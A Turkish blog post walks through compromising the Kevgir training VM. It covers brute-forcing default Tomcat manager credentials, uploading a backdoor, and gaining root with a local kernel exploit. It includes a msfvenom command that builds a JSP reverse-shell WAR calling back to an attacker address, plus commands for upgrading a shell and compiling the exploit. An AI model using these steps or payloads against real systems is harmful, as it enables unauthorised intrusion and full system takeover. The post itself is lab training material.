---
layout: post
title: Kevgir VM Sızma Testi ve Yetki Yükseltme Aşamaları
date: 2016-10-26 16:05
author: ahmetgurel
comments: true
categories: [kevgir çözümleri, Kevgir VM Sızma Testi ve Yetki Yükseltme Aşamaları, local root exploit kullanımı, Siber Güvenlik, sisteme sızma, sızma testi, Sızma Testi Araçları (Pentest Tools), tomcat exploit, yetki yükseltme]
---
Bu yazıda <a href="https://canyoupwn.me/">canyoupwn.me</a> ekibinden <a href="https://twitter.com/1ce7ea">Robin</a>in hazırladığı Kevgir adlı sanal makineye sızarak daha sonra yetki yükseltme aşamaları ile bir sızma testi senaryosu inceleyeceğiz.Öncelikle <a href="https://canyoupwn.me/kevgir-vulnerable-vm/">https://canyoupwn.me/kevgir-vulnerable-vm/ </a>adresinden Kevgiri indirerek bir sanal makinede açıyoruz.Lafı çok uzatmadan konuya gireyim :) Eğer Linux,Nmap ve Metasploit gibi konulara hakim değil iseniz daha önceden hazırlamış olduğum  <a href="https://www.exploit-db.com/docs/40408.pdf">Temel  Ağ Sızma Testine Giriş</a> dökümanıma göz atıp yazıyı okumanız daha faydalı olur.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/0.png"><img class="size-large wp-image-629 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/0-1024x553.png" alt="0" width="976" height="527" /></a>

Nmap ile keşif taramasına başlıyoruz.Çalışan servisleri ve versiyonları tespit ettikten sonra bu servisleri ve versiyonları detaylıca araştırarak bir zaafiyet varmı exploit db de yada başka site ve bloglarda bir şey varsa o hedef üzerinden sızmaya çalışılır.Bu makinede birden fazla açıklık bulunmakta fakat ben Tomcat üzerinden gideceğim.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/1.png"><img class="size-large wp-image-630 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/1-1024x555.png" alt="1" width="976" height="529" /></a>

Metasploiti açarak tomcat ile ilgili auxiliary ve exploitleri arıyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/2.png"><img class="size-large wp-image-631 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/2-1024x554.png" alt="2" width="976" height="528" /></a>

İlk olarak <strong>tomcat_mgr_login</strong> auxiliary ile tomcat servisinin default şifrelerini deniyoruz.Amacımız brute force yöntemi ile kullanıcı adı ve şifresini tespit etmek.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/3.png"><img class="size-large wp-image-632 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/3-1024x553.png" alt="3" width="976" height="527" /></a>

Görüldüğü üzere kullanıcı adı tomcat ve şifresi tomcat olarak tespit ettik.Genelde bir çok servis kurulum sırasındaki default şifreleri kullanmakta ve bu çok büyük riskler oluşturmakta.Mutlaka kurulum sırasında yada sonrasında kullanıcı adı ve şifresini değiştiriniz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/4.png"><img class="size-large wp-image-633 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/4-1024x556.png" alt="4" width="976" height="530" /></a>

Kullanıcı adı ve şifresini tespit ettikten sonra<strong> tomcat_mgr_upload</strong> exploitini kullanarak sisteme sızmaya çalışıyoruz.Tabi <strong>192.168.237.137:8080/manager </strong>adresi ile tarayıcıdan tomcat a giriş yaparak shellde atabilirsiniz.Farklı yollar ve yöntemler mevcut.Exploitin çalışması için gerekli parametreleri set ettikten sonra exploitimizi çalıştırıyoruz ve meterpreter e düşmüş bulunmaktayız.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/5.png"><img class="size-large wp-image-634 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/5-1024x550.png" alt="5" width="976" height="524" /></a>

Şimdi bir başka yol ile web adresi üzerinden bulduğumu kullanıcı adı ve şifre ile login olarak msfvenom ile backdoor oluşturup bu backdoor yardımı ile shell almayı göstereceğim.

<strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.237.128 LPORT=4444 -f war &gt; /root/Desktop/shell.war</strong>

ile shell.war adında jsp backdoor u oluşturuyoruz.

<strong>jar -xvf shell.war </strong>komutu ile shell.war içindekileri dışarı çıkarıp dosyaları görebilmekteyiz. Yükledikten sonra açacağımız jsp dosyasının adı önemli.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/1-4.png"><img class="alignnone size-large wp-image-652" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/1-4-1024x576.png" alt="" width="976" height="549" /></a>

192.168.237.137:8080/manager/ adresini tarayıcıdan girerek tomcat in web arayüzüne girebiliriz.girişte kullanıcı adı ve şifresi sorulacak biraz önce yukarıda elde ettiğimiz tomcat:tomcar kullanıcı adı ve şifresi ile erişebileceğiz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/2-5.png"><img class="alignnone size-large wp-image-653" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/2-5-1024x576.png" alt="" width="976" height="549" /></a>

Giriş yaptıkdan sonra tomcatin içinden wat dosyamızı upload adarak bacdoorumuzu sisteme yüklüyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/3-3.png"><img class="alignnone size-large wp-image-654" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/3-3-1024x576.png" alt="" width="976" height="549" /></a>

Dosyamızı yükledikden sonra metasploite girerek backdoorumuzu çalıştırmadan önce gerekli nodulümüze bağlanacağımız bacdoor payloadımızı ve bilgilerimizi giriyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/4-2.png"><img class="alignnone size-large wp-image-655" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/4-2-1024x576.png" alt="" width="976" height="549" /></a>

Bu noktadan sonra tek yapmamız gereken 192.168.237.137:8080/shell/hoxafoxvkhn.jsp adresimizi tarayıcadan girerek backdoorumuzu çalıştırıp metasploit ile shell açmak.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/5-3.png"><img class="alignnone size-large wp-image-656" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/5-3-1024x576.png" alt="" width="976" height="549" /></a>

Yukarıda gördüğünüz gibi shell açıldı.Bu senaryoda hem metasploit modülü ile hemde kendi backdoorumuzu web arayüzünden yükleyerek iki farklı yoldan shell aldık.Bu aşamadan sonra Privileges Escalation ve Post Exploitation aşamaları gerçekleştirmemiz gerekmektedir.Şimdi dönelim meterpreter komut satırından sonra yapacaklarımıza.

Meterpreter komut satırında shell yazarak linux komut satırına düşüyoruz.Fakat buradaki komut satırı etkilişimli değil.Bu demek oluyor ki girdi bekleyen linux komutlarını çalıştıramıyoruz.Mesala kullanıcı değiştirirken <strong>sudo su </strong>komutunu girdikten sonra şifre girdisi istiyor bu shell buna imkan vermiyor.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/6.png"><img class="size-large wp-image-635 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/6-1024x554.png" alt="6" width="976" height="528" /></a>

<strong>python -c 'import pty; pty.spawn("/bin/sh")'  </strong>yazarak shellimizi etkileşimli shelle çeviriyoruz.Resimdede gördüğünüz gibi artık $ işareti geldi.home dizinine giderek orada user ve admin olarak iki kullanıcı olduğunu gördük.Şimdi buradaki admin kullanıcısı aklınızı karıştırmasın.Ali,Ahmet gibi bir kullanıcı yetkili bir kullanıcı değil linuxta en yetkili kullanıcı root tur.Bu sistemdede hedefimiz root olmak.Şimdi burdaki admin kullanıcısına geçmeye çalışacağız.Aynı tomcatde default şifreler denendiği gibi admin kullanıcısının şifreside en çok kullanılan bir kaç şifre denedim.123456,password,admin gibi bunlardan admin admin kullanıcısının şifresi ise ve admine geçtik.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/7.png"><img class="size-large wp-image-636 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/7-1024x553.png" alt="7" width="976" height="527" /></a>

Şimdi uname -a komutu ile sistemin çekirdek bilgisini öğrendik.14.04.1 Ubuntu çalışmakta.Şuan admin kullanıcısındayız yapacağımız işlemler kısıtlı bunun için root kullanıcısına geçmemiz gerekmekte.Bunun içinde Local Root Exploitler bulunmakta şansımıza var ise bu exploit türünü çalıştırırak bulunduğunuz kullanıcıdan root kullanıcısına geçmemizi sağlamakta.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/8.png"><img class="size-large wp-image-637 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/8-1024x552.png" alt="8" width="976" height="526" /></a>

Googleda şöyle bir arama yaparak Local Root Exploitimizi buluyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/9.png"><img class="size-large wp-image-638 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/9-1024x553.png" alt="9" width="976" height="527" /></a>

&nbsp;

Bulduğumuz exploiti kopyalayarak shell aldığımız terminalde bir .c dosyası açarak içine yapıştırıyoruz.Yada başa bir şekilde bu exploit dosyasını shell aldığımız makinaya yüklüyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/10.png"><img class="size-large wp-image-639 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/10-1024x554.png" alt="10" width="976" height="528" /></a>

Burada <strong>vim ile localexploit.c</strong> adında bir dosya oluşturuyoruz ve içine kopyaladığımız exploiti yapıştırıyoruz.Yapıştırıken CTRL+SHIFT+V tuş kombinasyonunu kullanabilirsiniz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/11.png"><img class="size-large wp-image-640 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/11-1024x552.png" alt="11" width="976" height="526" /></a>

Yapıştırdıktan sonra vimde ESC ye basarak :wq komutu ile dosyamızı kaydetip çıkıyoruz.

<a href="http://www.gurelahmet.com/wp-content/uploads/2016/10/12.png"><img class="size-large wp-image-641 aligncenter" src="http://www.gurelahmet.com/wp-content/uploads/2016/10/12-1024x552.png" alt="12" width="976" height="526" /></a>

Dosyamızı kaydetip çıktıktan sonra <strong>gcc localexploit.c</strong> komutu ile c kodumuzu derliyoruz.Ve bize derlenmiş olarak <strong>a.out</strong> çıktısını veriyor.Bunuda <strong>./a.out</strong> komutu ile çalıştırdığımızda sistemde root kullanıcısına geçiyoruz.Bundan sonra sistemde istediğiniz her şeyi yapabilirsiniz.Sınırsız yetkiye sahipsiniz.

&nbsp;

&nbsp;
